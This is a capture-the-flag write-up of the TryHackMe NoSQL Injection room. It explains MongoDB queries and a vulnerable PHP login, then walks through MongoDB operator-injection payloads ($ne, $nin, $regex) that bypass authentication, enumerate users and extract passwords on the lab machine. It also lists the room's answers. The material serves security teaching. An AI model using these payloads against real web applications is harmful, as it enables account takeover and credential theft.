# NoSQL Injection

Room: [NoSQL Injection](https://tryhackme.com/room/nosqlinjectiontutorial)

Prerequisites:
1. [Burp Suite: Repeater](https://tryhackme.com/room/burpsuiterepeater)
2. [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)

<img width="942" height="206" alt="image" src="https://github.com/user-attachments/assets/465493a8-3d95-49fb-8497-82161aae7f76" />

## Introduction

In this room, you will learn about NoSQL Injection. While SQL-based databases are a popular choice for data storage of web applications, several database options that are not based on SQL also exist. Database solutions such as MongoDB, a NoSQL database solution, have seen a significant rise in popularity in recent years. 

## What is NoSQL

Before we can learn about NoSQL injection, let's first take a look how NoSQL databases work. In this room, we will focus on MongoDB. Although there are other NoSQL solutions, the principles about injection attacks in MongoDB can be applied to any NoSQL database.

---

### MongoDB

Much like MySQL, MariaDB, or PostgreSQL, MongoDB is another database where you can store data in an ordered way. MongoDB allows you to retrieve subsets of data in a quick and structured form. If you are familiar with relational databases, you can assume MongoDB works similarly to any other database. The major exception is that the information isn't stored on tables but rather in documents.

You can think of these documents as a simple dictionary structure where key-value pairs are stored. In a way, they are very similar to what you would call a record on a traditional relational database, but the information is just stored differently. 

For example, let's say we are creating a web application for the HR department, and we would like to store basic employee information. You would then create a document for each employee containing the data in a format that looks like this:

`{"_id" : ObjectId("5f077332de2cdf808d26cd74"), "username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }`

As you see, documents in MongoDB are stored in an associative array with an arbitrary number of fields.

An associative array is a data structure that stores information as key–value pairs instead of using numbered positions like traditional arrays like `array[0]`.

MongoDB allows you to group multiple documents with a similar function together in higher hierarchy structures called collections for organizational purposes. Collections are the equivalent of tables in relational databases. 

Continuing with our HR example, all the employee's documents would be conveniently grouped in a collection called "people" as shown in the diagram below.

<img width="728" height="314" alt="image" src="https://github.com/user-attachments/assets/8b770c4a-bf06-4258-8f49-6dcfc2b22617" />

Multiple collections are finally grouped in databases, which is the highest hierarchical element in MongoDB. In relational databases, the database concept groups tables together. In MongoDB, it groups related collections.

<img width="658" height="274" alt="image" src="https://github.com/user-attachments/assets/c849d1d0-289b-46cb-b219-b5de0d3825db" />

---

### Querying the Database

As with any database, a special language is used to retrieve information from the database. Just as relational databases use some variant of SQL, non-relational databases such as MongoDB use NoSQL. In general terms, NoSQL refers to any way of querying a database that is not SQL, meaning it may vary depending on the database used.

With MongoDB, queries use a structured associative array that contains groups of criteria to be met to filter the information. These filters offer similar functionality to a `WHERE` clause in SQL and offer operators the ability to build complex queries if needed.

To better understand NoSQL queries, let's start by assuming we have a database with a collection of people containing the following three documents:

<img width="591" height="152" alt="image" src="https://github.com/user-attachments/assets/21ab29a1-d5f8-4881-a7ee-6bb526ae7766" />

If we wanted to build a filter so that only the documents where the last_name is "Sandler" are retrieved, our filter would look like this: `['last_name' => 'Sandler']`

As a result, this query only retrieves the second document.

If we wanted to filter the documents where the gender is male, and the last_name is Phillips, we would have the following filter: `['gender' => 'male', 'last_name' => 'Phillips']`

This would only return the first document.

If we wanted to retrieve all documents where the age is less than 50, we could use the following filter: `['age' => ['$lt'=>'50']]`

This would return the second and third documents. Notice we are using the $lt operator in a nested array. Operators allow for more complex filters by nesting conditions.

A complete reference of possible operators can be found on the following link: [Query Predicates](https://www.mongodb.com/docs/manual/reference/mql/query-predicates/)

---

### Answer the questions below

1. What is a group of documents in MongoDB is known as?

Collection

2. Using the MongoDB Operator Reference, what operator is used to filter data when a field isn't equal to a given value?

`$ne`

3. Following the example of the 3 documents given before, how many documents would be returned by the following filter: `['gender' => ['$ne' => 'female'] , 'age' => ['$gt'=>'65'] ]?`

0

## NoSQL Injection

First, let's start the Lab Machine by pressing the Start Lab Machine button at the top of this task.

You may access the VM using the AttackBox or your VPN connection. I am using my Kali Linux as AttackBox and use OpenVPN to connect to TryHackMe Server.

Command: `sudo openvpn FILENAME`

You can check how to connect through OpenVPN by this room: [OpenVPN](https://tryhackme.com/room/openvpn)

Once the machine is ready, navigate to `http://MACHINE_IP` to start the exercise.

<img width="610" height="259" alt="image" src="https://github.com/user-attachments/assets/76dc9e2d-5c34-421b-9f44-17372342db47" />

---

### Injection is Injection

While it may seem complex to think about NoSQL Injection, when we boil down injection attacks to their very essence, we can understand the similarities between SQL Injection and NoSQL Injection.

The root cause of an injection attack is that improper concatenation of untrusted user input into a command can allow an attacker to alter the command itself. With SQL injection, the most common approach is to inject a single or double quote, that terminates the current data concatenation and allows the attacker to modify the query. The same approach applies to NoSQL Injection. If untrusted user input is directly added to the query, we have the opportunity to modify the query itself. However, with NoSQL Injection, even if we can't escape the current query, we still have the opportunity to manipulate the query itself. 

Therefore, there are two main types of NoSQL Injection:
- **Syntax Injection** - This is similar to SQL injection, where we have the ability to break out of the query and inject our own payload. The key difference to SQL injection is the syntax used to perform the injection attack.
- **Operator Injection** — Even if we can't break out of the query, we could potentially inject a NoSQL query operator that manipulates the query's behaviour, allowing us to stage attacks such as authentication bypasses.

---

### How to Inject NoSQL

When looking at how NoSQL filters are built, bypassing them to inject any payload might look impossible, as they rely on creating a structured array. Unlike SQL injection, where queries were normally built by simple string concatenation, NoSQL queries require nested associative arrays. From an attacker's point of view, this means that to inject NoSQL, one must be able to inject arrays into the application.

Luckily for us, many server-side programming languages allow passing array variables by using a special syntax on the query string of an HTTP Request.

For the purpose of this example, let's focus on the following code written in PHP for a simple login page:

```
<?php
$con = new MongoDB\Driver\Manager("mongodb://localhost:27017");


if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
        $user = $_POST['user'];
        $pass = $_POST['pass'];

        $q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
        $record = $con->executeQuery('myapp.login', $q );
        $record = iterator_to_array($record);

        if(sizeof($record)>0){
                $usr = $record[0];

                session_start();
                $_SESSION['loggedin'] = true;
                $_SESSION['uid'] = $usr->username;

                header('Location: /sekr3tPl4ce.php');
                die();
        }
}
header('Location: /?err=1');

?>
```

The web application is making a query to MongoDB, using the "myapp" database and "login" collection, requesting any document that passes the filter `['username'=>$user, 'password'=>$pass]`, where both `$user` and `$pass` are obtained directly from HTTP POST parameters.

Let's take a look at how we can leverage Operator Injection in order to bypass authentication.

If somehow we could send an array to the $user and $pass variables with the following content:

`$user = ['$ne'=>'xxxx']` 

`$pass = ['$ne'=>'yyyy']`

The resulting filter would end up looking like this: `['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]`

We could trick the database into returning any document where the username isn't equal to 'xxxx,' and the password isn't equal to 'yyyy'. This would probably return all documents in the login collection. As a result, the application would assume a correct login was performed and let us into the application with the privileges of the user corresponding to the first document obtained from the database.

The problem that remains unsolved is how to pass an array as part of a POST HTTP Request. It turns out that PHP and many other languages allow you to pass an array by using the following notation on the POST Request Body: `user[$ne]=xxxx&pass[$ne]=yyyy`

---

### Answer the questions below

1. What type of NoSQL Injection is similar to normal SQL Injection?

Syntax

2. What type of NoSQL Injection allows you to modify the behaviour of the query, even if you can't escape the syntax?

Operator

## Operator Injection: Bypassing the Login Screen

First of all, let's open the website on `http://MACHINE_IP/` and send an incorrect user/pass to capture the request on Burp.

Open the Proxy tab with Intecept on and get the request:

<img width="531" height="149" alt="image" src="https://github.com/user-attachments/assets/a96a6ec9-0e26-461d-9e5b-16e42868a9f0" />

We now proceed to intercept another login request and modify the user and pass variables to send the desired arrays.

Modify the parameters to: `user[$ne]=raven&pass[$ne]=123&remember=on`

Then click Forward to send the Request to the server and then turn the Intercept off by clicking the Intecept on button.

This forces the database to return all user documents and as a result we are finally logged into the application:

<img width="121" height="68" alt="image" src="https://github.com/user-attachments/assets/4bbff90e-2d3e-4387-878b-b01ea4e82930" />

---

### Answer the questions below

When bypassing the login screen using the $ne operator, what is the email of the user that you are logged in as?

`admin@nosql.int`

## Operator Injection: Logging in as Other Users

### Logging in as Other Users

We have managed to bypass the application's login screen, but with the former technique, we can only login as the first user returned by the database. By making use of the `$nin` operator, we are going to modify our payload so that we can control which user we want to obtain.

First, the `$nin` operator allows us to create a filter by specifying criteria where the desired documents have some field, not in a list of values. So if we want to log in as any user except for the user admin, we could modify our payload to look like this: `user[$nin][]=admin&pass[$ne]=123&remember=on`

<img width="530" height="152" alt="image" src="https://github.com/user-attachments/assets/10d0160c-70ee-450b-b5a3-88ef2b7372b2" />

This would translate to a filter that has the following structure: `['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'123']]`

Which tells the database to return any user for whom the username isn't admin and the password isn't aweasdf. As a result, we are now granted access to another user's account.

<img width="140" height="67" alt="image" src="https://github.com/user-attachments/assets/b19e91b5-a6a0-4ae1-8bfa-4123c28e1d69" />

Notice that the $nin operator receives a list of values to ignore. We can continue to expand the list by adjusting our payload as follows: `user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=123&remember=on`

<img width="527" height="155" alt="image" src="https://github.com/user-attachments/assets/966ebfb5-3169-4850-a1d1-ab84a7920448" />

This would result in a filter like this: `['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']]`

This can be repeated as many times as needed until we gain access to all of the available accounts.

Note: The jude user above is not an actual user, but an example of how an additional username can be added.

---

### Answer the questions below

1. How many users are there in total?

4

We already know 2 users that are `admin` and `pedro` so we will update the parameters to ignore these two parameters: `user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=123&remember=on`

<img width="121" height="68" alt="image" src="https://github.com/user-attachments/assets/36780df0-95d4-4aef-9fc9-0dbb3664bb61" />

Updating the parameters again to ignore these three users: `user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&pass[$ne]=123&remember=on`

<img width="137" height="77" alt="image" src="https://github.com/user-attachments/assets/1a1fa8ed-6654-4bdd-87e2-37c24d82f8df" />

Updating again to see more than four users: `user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&user[$nin][]=secret&pass[$ne]=123&remember=on`

We get an error meaning there are total four users.

2. There is a user that starts with the letter "p". What is his username?

`pedro`

## Operator Injection: Extracting Users' Password

### Extracting Users' Passwords

At this point, we have access to all of the accounts in the application. However, it is important to try to extract the actual passwords in use as they might be reused in other services. To accomplish this, we will be abusing the `$regex` operator to ask a series of questions to the server that allow us to recover the passwords via a process that resembles playing the game hangman.

First, let's take one of the users discovered before and try to guess the length of his password.

I am using the username `admin` and then just entering the fake password to get the request in Burp Suite. Then send the request to Repeater section.

We will be using the following payload to actual guess the password: `user=admin&pass[$regex]=^.{7}$&remember=on`

<img width="506" height="172" alt="image" src="https://github.com/user-attachments/assets/7f71eb56-98ec-40ac-a10c-cb6eee920bf3" />

Notice that we are asking the database if there is a user with a username of admin and a password that matches the regex: `^.{7}$`. This basically represents a wildcard word of length 7. Since the server responds with a login error, we know the password length for the user admin isn't 7.

After some trial and error, we finally arrived at the correct answer:

<img width="551" height="194" alt="image" src="https://github.com/user-attachments/assets/6a6de989-7ed9-4ca4-a0b2-7f702ffd5c8b" />

We now know the password for user admin has length 8. Now to figure out the actual content, we modify our payload as follows: `user=admin&pass[$regex]=^c.......$&remember=on`

<img width="479" height="176" alt="image" src="https://github.com/user-attachments/assets/fb16c516-cfbf-4137-94ea-bc7f068ec938" />

We are now working with a regex of length 8 (a single letter c plus 7 dots), matching the discovered password length, and asking if the admin's password matches the regex `^c.......$`, which means it starts with a lowercase c, followed by any 4 characters. Since the server response is an invalid login, we now know the first letter of the password can't be "c". We continue iterating over all available characters until we get a successful response from the server:

<img width="535" height="173" alt="image" src="https://github.com/user-attachments/assets/e6b85d4d-99a3-4268-8911-a7e860338544" />

This confirms that the first letter of admin's password is 'a'. The same process can be repeated for the other letters until the full password is recovered. This can be repeated for other users as well if needed.

---

### Answer the questions below

1. What is john's password?

`10584312`

Updating the payload and first guessing the length of the password: `user=john&pass[$regex]=^.{7}$&remember=on`

<img width="479" height="172" alt="image" src="https://github.com/user-attachments/assets/66951136-1ddb-4339-b395-ddad733f7063" />

After hit and tests, we see the password length is 8.

<img width="539" height="171" alt="image" src="https://github.com/user-attachments/assets/6aa23703-8053-4e80-8822-c0f9888901f0" />

Now guessing the first character of the password: `user=john&pass[$regex]=^a.......$&remember=on

<img width="473" height="173" alt="image" src="https://github.com/user-attachments/assets/516da61a-304f-4ead-83d5-70d5ecce6d3b" />

After checking, we see 1 as the first character of the password.

<img width="551" height="171" alt="image" src="https://github.com/user-attachments/assets/ca1f30b3-9377-4a0d-86a5-d51342e46dc0" />

Now guessing the second character of the password: `user=john&pass[$regex]=^11......$&remember=on`

Got 0 as the second character of the password.

<img width="545" height="184" alt="image" src="https://github.com/user-attachments/assets/1d1e4eeb-45c7-4598-883a-7fba1c8bce8f" />

Repeating the process same for rest of the characters. The password is `10584312`    

<img width="548" height="167" alt="image" src="https://github.com/user-attachments/assets/8add6789-7986-4617-bc53-e61ac82876b2" />

2. One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!

Let's check for `pedro`, so guessing the password first same as above: `user=pedro&pass[$regex]=^.{7}$&remember=on`

Correct length is 11.

<img width="535" height="173" alt="image" src="https://github.com/user-attachments/assets/4d1b1e26-b848-4aba-a877-935ebaa89dd3" />

Now guessing the first character of the password: `user=pedro&pass[$regex]=^0..........$&remember=on`

Correct first character is c.

<img width="548" height="174" alt="image" src="https://github.com/user-attachments/assets/e8ab1a57-0f4c-4463-8074-ca262ff8a69d" />

Guessing rest of the password, password is `coolpass123`

<img width="553" height="173" alt="image" src="https://github.com/user-attachments/assets/36ee8558-bd02-4192-8362-145f94d57275" />

Then write the SSH Command to connect to the Pedro's machine: `ssh pedro@MACHINE_IP`

Then write the password and get the flag.

<img width="834" height="447" alt="image" src="https://github.com/user-attachments/assets/7097eb10-fbfc-40ec-bae9-db8d50364880" />























